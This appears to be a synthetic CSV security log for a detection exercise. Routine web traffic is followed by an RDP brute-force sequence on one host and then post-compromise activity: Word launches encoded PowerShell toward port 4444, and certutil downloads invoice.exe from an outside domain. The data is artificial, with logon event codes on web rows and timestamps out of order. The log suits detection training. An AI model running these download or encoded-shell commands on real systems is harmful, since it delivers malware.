_time,src_ip,dst_ip,user,action,EventCode,dest_port,ParentImage,Image,CommandLine,bytes_out,hash,url
2024-03-15 08:06:08,10.0.0.26,151.101.1.140,a.jones,ALLOWED,4624,53,,,,,https://cloudflare.com/
2024-03-15 08:06:47,10.0.0.26,140.82.121.4,s.lee,ALLOWED,4624,53,,,,,https://office.com/
2024-03-15 08:07:15,10.0.0.24,151.101.1.140,d.brown,ALLOWED,4624,80,,,,,https://google.com/
2024-03-15 08:07:23,10.0.0.17,151.101.1.140,k.wilson,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:07:55,10.0.0.48,142.250.80.46,s.lee,ALLOWED,4624,80,,,,,https://cloudflare.com/
2024-03-15 08:08:29,10.0.0.43,104.16.249.249,d.brown,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:08:41,10.0.0.53,140.82.121.4,m.garcia,ALLOWED,4624,53,,,,,https://microsoft.com/
2024-03-15 08:08:53,10.0.0.28,13.107.42.14,a.jones,ALLOWED,4624,80,,,,,https://google.com/
2024-03-15 08:09:14,10.0.0.42,151.101.1.140,d.brown,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:09:38,10.0.0.50,140.82.121.4,d.brown,ALLOWED,4624,443,,,,,https://github.com/
2024-03-15 08:10:06,10.0.0.58,151.101.1.140,d.brown,ALLOWED,4624,53,,,,,https://google.com/
2024-03-15 08:10:31,10.0.0.41,142.250.80.46,j.smith,ALLOWED,4624,80,,,,,https://microsoft.com/
2024-03-15 08:10:51,10.0.0.13,151.101.1.140,d.brown,ALLOWED,4624,443,,,,,https://google.com/
2024-03-15 08:11:27,10.0.0.14,140.82.121.4,a.jones,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:12:02,10.0.0.45,151.101.1.140,m.garcia,ALLOWED,4624,53,,,,,https://cloudflare.com/
2024-03-15 08:12:34,10.0.0.23,140.82.121.4,k.wilson,ALLOWED,4624,53,,,,,https://github.com/
2024-03-15 08:12:58,10.0.0.35,104.16.249.249,s.lee,ALLOWED,4624,53,,,,,https://office.com/
2024-03-15 08:13:10,10.0.0.25,151.101.1.140,j.smith,ALLOWED,4624,80,,,,,https://google.com/
2024-03-15 08:13:50,10.0.0.24,140.82.121.4,a.jones,ALLOWED,4624,443,,,,,https://google.com/
2024-03-15 08:13:58,10.0.0.24,142.250.80.46,j.smith,ALLOWED,4624,80,,,,,https://google.com/
2024-03-15 08:14:35,10.0.0.25,104.16.249.249,k.wilson,ALLOWED,4624,80,,,,,https://github.com/
2024-03-15 08:15:14,10.0.0.18,140.82.121.4,d.brown,ALLOWED,4624,80,,,,,https://github.com/
2024-03-15 08:15:49,10.0.0.36,151.101.1.140,j.smith,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:16:21,10.0.0.32,13.107.42.14,s.lee,ALLOWED,4624,80,,,,,https://linkedin.com/
2024-03-15 08:16:29,10.0.0.53,142.250.80.46,j.smith,ALLOWED,4624,80,,,,,https://linkedin.com/
2024-03-15 08:16:55,10.0.0.16,151.101.1.140,a.jones,ALLOWED,4624,443,,,,,https://cloudflare.com/
2024-03-15 08:17:28,10.0.0.18,13.107.42.14,a.jones,ALLOWED,4624,80,,,,,https://office.com/
2024-03-15 08:17:48,10.0.0.14,13.107.42.14,d.brown,ALLOWED,4624,443,,,,,https://google.com/
2024-03-15 08:18:27,10.0.0.10,142.250.80.46,a.jones,ALLOWED,4624,443,,,,,https://office.com/
2024-03-15 08:19:03,10.0.0.40,151.101.1.140,s.lee,ALLOWED,4624,443,,,,,https://github.com/
2024-03-15 08:19:32,10.0.0.10,13.107.42.14,m.garcia,ALLOWED,4624,80,,,,,https://microsoft.com/
2024-03-15 08:20:04,10.0.0.54,140.82.121.4,k.wilson,ALLOWED,4624,53,,,,,https://office.com/
2024-03-15 08:20:18,10.0.0.22,104.16.249.249,a.jones,ALLOWED,4624,443,,,,,https://cloudflare.com/
2024-03-15 08:20:57,10.0.0.13,104.16.249.249,j.smith,ALLOWED,4624,443,,,,,https://cloudflare.com/
2024-03-15 08:21:32,10.0.0.42,140.82.121.4,a.jones,ALLOWED,4624,443,,,,,https://cloudflare.com/
2024-03-15 08:21:42,10.0.0.21,142.250.80.46,d.brown,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:22:02,10.0.0.35,142.250.80.46,d.brown,ALLOWED,4624,443,,,,,https://cloudflare.com/
2024-03-15 08:22:09,10.0.0.49,142.250.80.46,s.lee,ALLOWED,4624,53,,,,,https://cloudflare.com/
2024-03-15 08:22:47,10.0.0.30,104.16.249.249,a.jones,ALLOWED,4624,53,,,,,https://linkedin.com/
2024-03-15 08:23:12,10.0.0.25,104.16.249.249,s.lee,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:23:36,10.0.0.39,104.16.249.249,j.smith,ALLOWED,4624,443,,,,,https://office.com/
2024-03-15 08:23:47,10.0.0.14,140.82.121.4,a.jones,ALLOWED,4624,53,,,,,https://microsoft.com/
2024-03-15 08:24:00,10.0.0.32,142.250.80.46,a.jones,ALLOWED,4624,80,,,,,https://microsoft.com/
2024-03-15 08:24:15,10.0.0.38,140.82.121.4,k.wilson,ALLOWED,4624,80,,,,,https://cloudflare.com/
2024-03-15 08:24:53,10.0.0.10,140.82.121.4,m.garcia,ALLOWED,4624,53,,,,,https://google.com/
2024-03-15 08:25:06,10.0.0.26,142.250.80.46,j.smith,ALLOWED,4624,53,,,,,https://cloudflare.com/
2024-03-15 08:25:20,10.0.0.27,104.16.249.249,d.brown,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:25:46,10.0.0.23,104.16.249.249,d.brown,ALLOWED,4624,80,,,,,https://microsoft.com/
2024-03-15 08:25:54,10.0.0.15,13.107.42.14,m.garcia,ALLOWED,4624,443,,,,,https://google.com/
2024-03-15 08:26:20,10.0.0.59,151.101.1.140,k.wilson,ALLOWED,4624,80,,,,,https://github.com/
2024-03-15 08:26:53,10.0.0.45,13.107.42.14,d.brown,ALLOWED,4624,443,,,,,https://google.com/
2024-03-15 08:27:02,10.0.0.54,151.101.1.140,d.brown,ALLOWED,4624,443,,,,,https://microsoft.com/
2024-03-15 08:27:42,10.0.0.19,13.107.42.14,a.jones,ALLOWED,4624,443,,,,,https://microsoft.com/
2024-03-15 08:28:10,10.0.0.12,104.16.249.249,a.jones,ALLOWED,4624,53,,,,,https://github.com/
2024-03-15 08:28:21,10.0.0.32,140.82.121.4,s.lee,ALLOWED,4624,53,,,,,https://linkedin.com/
2024-03-15 08:28:35,10.0.0.25,151.101.1.140,a.jones,ALLOWED,4624,80,,,,,https://google.com/
2024-03-15 08:28:51,10.0.0.57,104.16.249.249,s.lee,ALLOWED,4624,53,,,,,https://linkedin.com/
2024-03-15 08:29:11,10.0.0.27,151.101.1.140,k.wilson,ALLOWED,4624,443,,,,,https://office.com/
2024-03-15 08:29:18,10.0.0.40,151.101.1.140,a.jones,ALLOWED,4624,80,,,,,https://microsoft.com/
2024-03-15 08:29:42,10.0.0.24,151.101.1.140,j.smith,ALLOWED,4624,53,,,,,https://github.com/
2024-03-15 08:30:12,10.0.0.31,104.16.249.249,j.smith,ALLOWED,4624,80,,,,,https://microsoft.com/
2024-03-15 08:30:49,10.0.0.35,140.82.121.4,m.garcia,ALLOWED,4624,443,,,,,https://google.com/
2024-03-15 08:31:10,10.0.0.21,140.82.121.4,m.garcia,ALLOWED,4624,443,,,,,https://google.com/
2024-03-15 08:31:42,10.0.0.32,104.16.249.249,s.lee,ALLOWED,4624,53,,,,,https://cloudflare.com/
2024-03-15 08:31:54,10.0.0.34,140.82.121.4,a.jones,ALLOWED,4624,80,,,,,https://google.com/
2024-03-15 08:32:26,10.0.0.10,140.82.121.4,d.brown,ALLOWED,4624,53,,,,,https://linkedin.com/
2024-03-15 08:32:43,10.0.0.33,13.107.42.14,j.smith,ALLOWED,4624,53,,,,,https://microsoft.com/
2024-03-15 08:33:08,10.0.0.52,142.250.80.46,k.wilson,ALLOWED,4624,80,,,,,https://cloudflare.com/
2024-03-15 08:33:32,10.0.0.52,13.107.42.14,m.garcia,ALLOWED,4624,80,,,,,https://linkedin.com/
2024-03-15 08:33:55,10.0.0.45,151.101.1.140,a.jones,ALLOWED,4624,80,,,,,https://linkedin.com/
2024-03-15 08:34:24,10.0.0.53,151.101.1.140,d.brown,ALLOWED,4624,53,,,,,https://microsoft.com/
2024-03-15 08:34:54,10.0.0.45,142.250.80.46,m.garcia,ALLOWED,4624,80,,,,,https://github.com/
2024-03-15 08:35:26,10.0.0.47,140.82.121.4,k.wilson,ALLOWED,4624,80,,,,,https://office.com/
2024-03-15 08:35:59,10.0.0.38,151.101.1.140,d.brown,ALLOWED,4624,80,,,,,https://linkedin.com/
2024-03-15 08:36:14,10.0.0.52,142.250.80.46,m.garcia,ALLOWED,4624,53,,,,,https://linkedin.com/
2024-03-15 08:36:40,10.0.0.15,151.101.1.140,k.wilson,ALLOWED,4624,80,,,,,https://github.com/
2024-03-15 08:36:57,10.0.0.19,142.250.80.46,j.smith,ALLOWED,4624,443,,,,,https://office.com/
2024-03-15 08:37:06,10.0.0.39,13.107.42.14,k.wilson,ALLOWED,4624,53,,,,,https://github.com/
2024-03-15 08:37:35,10.0.0.41,13.107.42.14,a.jones,ALLOWED,4624,443,,,,,https://linkedin.com/
2024-03-15 08:37:40,10.0.0.58,142.250.80.46,s.lee,ALLOWED,4624,443,,,,,https://github.com/
2024-03-15 08:38:18,10.0.0.39,142.250.80.46,d.brown,ALLOWED,4624,443,,,,,https://google.com/
2024-03-15 08:38:52,10.0.0.18,13.107.42.14,k.wilson,ALLOWED,4624,53,,,,,https://cloudflare.com/
2024-03-15 08:39:17,10.0.0.58,13.107.42.14,d.brown,ALLOWED,4624,53,,,,,https://cloudflare.com/
2024-03-15 08:39:49,10.0.0.45,13.107.42.14,a.jones,ALLOWED,4624,53,,,,,https://office.com/
2024-03-15 08:40:22,10.0.0.26,151.101.1.140,k.wilson,ALLOWED,4624,80,,,,,https://cloudflare.com/
2024-03-15 08:40:58,10.0.0.50,151.101.1.140,m.garcia,ALLOWED,4624,80,,,,,https://google.com/
2024-03-15 08:41:21,10.0.0.25,104.16.249.249,m.garcia,ALLOWED,4624,80,,,,,https://cloudflare.com/
2024-03-15 08:41:31,10.0.0.18,151.101.1.140,a.jones,ALLOWED,4624,80,,,,,https://linkedin.com/
2024-03-15 08:41:45,10.0.0.55,151.101.1.140,j.smith,ALLOWED,4624,80,,,,,https://office.com/
2024-03-15 08:42:11,10.0.0.44,13.107.42.14,s.lee,ALLOWED,4624,443,,,,,https://github.com/
2024-03-15 08:42:42,10.0.0.34,140.82.121.4,k.wilson,ALLOWED,4624,443,,,,,https://cloudflare.com/
2024-03-15 08:43:11,10.0.0.40,142.250.80.46,m.garcia,ALLOWED,4624,80,,,,,https://office.com/
2024-03-15 08:43:42,10.0.0.44,140.82.121.4,d.brown,ALLOWED,4624,443,,,,,https://office.com/
2024-03-15 08:44:01,10.0.0.27,13.107.42.14,s.lee,ALLOWED,4624,443,,,,,https://office.com/
2024-03-15 08:44:27,10.0.0.52,13.107.42.14,k.wilson,ALLOWED,4624,443,,,,,https://office.com/
2024-03-15 08:44:40,10.0.0.49,140.82.121.4,j.smith,ALLOWED,4624,80,,,,,https://cloudflare.com/
2024-03-15 08:44:46,10.0.0.15,13.107.42.14,a.jones,ALLOWED,4624,80,,,,,https://github.com/
2024-03-15 08:44:54,10.0.0.26,13.107.42.14,m.garcia,ALLOWED,4624,443,,,,,https://office.com/
2024-03-15 08:45:19,10.0.0.31,13.107.42.14,m.garcia,ALLOWED,4624,80,,,,,https://microsoft.com/
2024-03-15 08:45:29,10.0.0.40,142.250.80.46,k.wilson,ALLOWED,4624,53,,,,,https://google.com/
2024-03-15 08:45:56,10.0.0.24,142.250.80.46,k.wilson,ALLOWED,4624,443,,,,,https://google.com/
2024-03-15 08:46:16,10.0.0.22,142.250.80.46,d.brown,ALLOWED,4624,443,,,,,https://github.com/
2024-03-15 08:46:29,10.0.0.40,142.250.80.46,d.brown,ALLOWED,4624,443,,,,,https://office.com/
2024-03-15 08:46:50,10.0.0.59,104.16.249.249,a.jones,ALLOWED,4624,53,,,,,https://cloudflare.com/
2024-03-15 08:47:02,10.0.0.59,151.101.1.140,m.garcia,ALLOWED,4624,443,,,,,https://cloudflare.com/
2024-03-15 08:47:08,10.0.0.29,140.82.121.4,k.wilson,ALLOWED,4624,80,,,,,https://office.com/
2024-03-15 08:47:25,10.0.0.14,140.82.121.4,k.wilson,ALLOWED,4624,53,,,,,https://github.com/
2024-03-15 08:47:36,10.0.0.54,104.16.249.249,k.wilson,ALLOWED,4624,53,,,,,https://google.com/
2024-03-15 08:47:43,10.0.0.32,140.82.121.4,s.lee,ALLOWED,4624,53,,,,,https://microsoft.com/
2024-03-15 08:47:52,10.0.0.42,104.16.249.249,j.smith,ALLOWED,4624,80,,,,,https://office.com/
2024-03-15 08:48:03,10.0.0.37,104.16.249.249,k.wilson,ALLOWED,4624,80,,,,,https://linkedin.com/
2024-03-15 08:41:40,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:43,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:46,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:49,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:52,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:55,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:41:58,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:01,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:04,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:07,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:10,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:13,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:16,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:19,185.220.101.45,10.0.0.42,admin,BLOCKED,4625,3389,,,,,
2024-03-15 08:42:40,185.220.101.45,10.0.0.42,admin,ALLOWED,4624,3389,,,,,
2024-03-15 08:43:40,10.0.0.42,185.220.101.45,SYSTEM,ALLOWED,4688,4444,C:\Program Files\Microsoft Office\WINWORD.EXE,powershell.exe,powershell -enc JABIAE0A...,500,
2024-03-15 08:44:10,10.0.0.42,185.220.101.45,SYSTEM,ALLOWED,4688,443,explorer.exe,cmd.exe,cmd /c certutil -urlcache -f http://update-cdn-verify.xyz/invoice.exe,250000000,091b572abf984382a95b9455e407f284e24bfb616890abc3fcdb2be68813f39d
